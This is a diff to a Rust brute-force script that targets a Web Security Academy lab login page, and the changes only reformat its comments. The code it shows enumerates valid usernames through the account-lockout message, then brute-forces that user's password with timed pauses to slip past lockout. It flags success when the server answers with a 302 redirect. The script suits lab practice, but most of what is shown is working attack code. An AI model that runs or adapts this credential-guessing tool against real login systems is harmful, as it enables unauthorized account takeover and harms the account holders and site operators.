@@ -52,37 +52,61 @@ lazy_static! {
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a9000d304f97346803fdacd006000f3.web-security-academy.net/login"; // change this url
-    let client = build_client(); // build the client which will be used in all subsequent requests
-    let usernames = fs::read_to_string("/home/ahmed/users").unwrap(); // change the path to your list
-    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap(); // change the path your list
+    // change this to your lab URL
+    let url = "https://0a9000d304f97346803fdacd006000f3.web-security-academy.net/login";
 
-    let start_time = time::Instant::now(); // capture the time before enumeration
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
 
-    let valid_user = get_valid_username(start_time, url, &client, usernames); // try to get a valid username
+    // read usernames to as one big string
+    // change the path to your list
+    let usernames = fs::read_to_string("/home/ahmed/users").unwrap();
+
+    // read passwords to as one big string
+    // change the path to your list
+    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap();
+
+    // capture the time before enumeration
+    let start_time = time::Instant::now();
+
+    // try to get a valid username
+    let valid_user = get_valid_username(start_time, url, &client, usernames);
+
+    // set valid password to an empty string
     let mut valid_password = Some(String::new());
+
+    // if you found a valid one
     if let Some(user) = valid_user {
-        // if you found a valid one
-        valid_password = brute_force_password(start_time, url, client, &user, passwords); // brute force his password
+        // brute force his password
+        valid_password = brute_force_password(start_time, url, client, &user, passwords);
+        // if you found a valid password
         match valid_password {
-            // if you found a valid password
             Some(password) => {
-                print_valid_credentials(&user, &password); // print valid credential
-                save_results(start_time, "results", &user, &password);
-                // save resultes to a file in the current working directory
+                print_valid_credentials(&user, &password);
+
+                // save results  to a file in the current working directory
                 // you can change this name to what you want
+                save_results(start_time, "results", &user, &password);
             }
             None => {
-                save_results(start_time, "results", &user, ""); // save resultes to a file in the current working directory
                 println!("{}", "[!] Couldn't find valid password".red());
+
+                // save results  to a file in the current working directory
+                save_results(start_time, "results", &user, "");
             }
         }
     } else {
-        save_results(start_time, "results", "", ""); // save resultes to a file in the current working directory
         println!("{}", "[!] Couldn't find valid username".red());
+
+        // save results  to a file in the current working directory
+        save_results(start_time, "results", "", "");
     }
-    print_finish_message(start_time); // print the total elapsed time
-    print_failed_requests(); // print the failed request to try them later
+
+    // print some useful information to the terminal
+    print_finish_message(start_time);
+
+    // print the failed requests to try them later
+    print_failed_requests();
 }
 
 /*******************************************************************
@@ -112,8 +136,12 @@ fn get_valid_username(
     usernames: String,
 ) -> Option<String> {
     println!("[#] Enumerate usernames..");
-    let regex = Regex::new("You have made too many incorrect login attempts").unwrap(); // pattern to search for
-    let total_counts = usernames.lines().count(); // total number of usernames to try
+
+    // pattern to search for
+    let regex = Regex::new("You have made too many incorrect login attempts").unwrap();
+    // get total number of usernames to try
+    let total_counts = usernames.lines().count();
+
     for x in 0..4 {
         println!(
             "\n{} {} {}..",
@@ -121,12 +149,18 @@ fn get_valid_username(
             x.to_string().blue().bold(),
             "of all users".white().bold()
         );
+        // iterate over the usernames and their indices
         for (index, user) in usernames.lines().enumerate() {
-            // iterate over the usernames list
-            let success_counter = USERS_COUNTER.fetch_add(1, Ordering::Relaxed); // update the success counter
-            let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed); // get the fail counter value
-            let elapsed_time = start_time.elapsed().as_secs() / 60; // get elapsed time in minutes
-                                                                    // print the update inforamtion to the terminal
+            // update the success counter
+            let success_counter = USERS_COUNTER.fetch_add(1, Ordering::Relaxed);
+
+            // get the fail counter value
+            let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);
+
+            // calculate the elapsed time
+            let elapsed_time = start_time.elapsed().as_secs() / 60;
+
+            // print the update inforamtion to the terminal
             print_progress(
                 elapsed_time,
                 fail_counter,
@@ -134,31 +168,47 @@ fn get_valid_username(
                 total_counts,
                 user,
             );
-            let data = HashMap::from([("username", user), ("password", "not important now")]); // the POST data to send
-            let mut login = client.post(url).form(&data).send(); // try to login
+
+            // the POST data to send
+            let data = HashMap::from([("username", user), ("password", "not important now")]);
+
+            // try to login
+            let mut login = client.post(url).form(&data).send();
+
+            // if the request succeeded
             if let Ok(res) = login {
-                // if the request succeeded
-                let body = &res.text().unwrap(); // get the response body
-                let pattern_existance = regex.find(body); // search for the pattern
+                // get the response body
+                let body = &res.text().unwrap();
+
+                // search for the pattern
+                let pattern_existance = regex.find(body);
+
+                // if the pattern not found
                 if pattern_existance.is_some() {
-                    // if the pattern not found
-                    return Some(user.to_string()); // return that valid user
+                    // return that valid user
+                    return Some(user.to_string());
                 }
             } else {
                 // if the request faild try to send it again
-                login = client.post(url).form(&data).send(); // try to login
+                login = client.post(url).form(&data).send();
+                // if the request succeeded
                 if let Ok(res) = login {
-                    // if the request succeeded
-                    let body = &res.text().unwrap(); // get the response body
-                    let pattern_existance = regex.find(body); // search for the pattern
+                    // get the response body
+                    let body = &res.text().unwrap();
+
+                    // search for the pattern
+                    let pattern_existance = regex.find(body);
+
+                    // if the pattern not found
                     if pattern_existance.is_some() {
-                        // if the pattern not found
-                        return Some(user.to_string()); // return that valid user
+                        // return that valid user
+                        return Some(user.to_string());
                     }
                 } else {
+                    // add 1 to failed counter
+                    FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed);
                     // if the request failed after 2 tries, save it to try later
-                    FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed); // add 1 to failed counter
-                    FAILED_USERS.lock().unwrap().push(user.to_string()); // save this user to a list to try it later
+                    FAILED_USERS.lock().unwrap().push(user.to_string());
                 }
             }
         }
@@ -190,18 +240,29 @@ fn brute_force_password(
         "✅ Valid user".white().bold(),
         valid_user.green().bold()
     );
-    let total_counts = passwords.lines().count(); // total number of passwords to try
-                                                  // iterate over the whole list of passwords
-    for (index, password) in passwords.lines().enumerate() {
-        let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed); // update the success counter
-        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed); // get the fail counter value
-        let elapsed_time = start_time.elapsed().as_secs() / 60; // get elapse time in minutes
-                                                                // print the update info
+    // get total number of passwords to try
+    let total_counts = passwords.lines().count();
 
+    // iterate over the whole list of passwords
+    for (index, password) in passwords.lines().enumerate() {
+        // update the success counter
+        let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
+
+        // get the fail counter value
+        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);
+
+        // calculate the elapsed time
+        let elapsed_time = start_time.elapsed().as_secs() / 60;
+
+        // wait 1 minute after every 2 failed requests
         if index % 3 == 0 {
             println!("\n{}", "Waiting 1 minute..".yellow().bold());
+
+            // wait 1 minute
             thread::sleep(Duration::from_secs(60));
         }
+
+        // print some useful information to the terminal
         print_progress(
             elapsed_time,
             fail_counter,
@@ -209,14 +270,21 @@ fn brute_force_password(
             total_counts,
             password,
         );
-        let data = HashMap::from([("username", valid_user), ("password", password)]); // the POST data to send
-        let mut login = client.post(url).form(&data).send(); // try to login
+
+        // the POST data to send
+        let data = HashMap::from([("username", valid_user), ("password", password)]);
+
+        // try to login
+        let mut login = client.post(url).form(&data).send();
+
+        // if the request succeeded
         if let Ok(res) = login {
-            // if the request succeeded
+            // if a redirection happens ( correct password )
             if res.status().as_u16() == 302 {
-                // if a redirection happens ( correct password )
                 println!("");
-                return Some(password.to_string()); // return the valid password
+
+                // return the valid password
+                return Some(password.to_string());
             }
         } else {
             // if the request failed, try to send it again
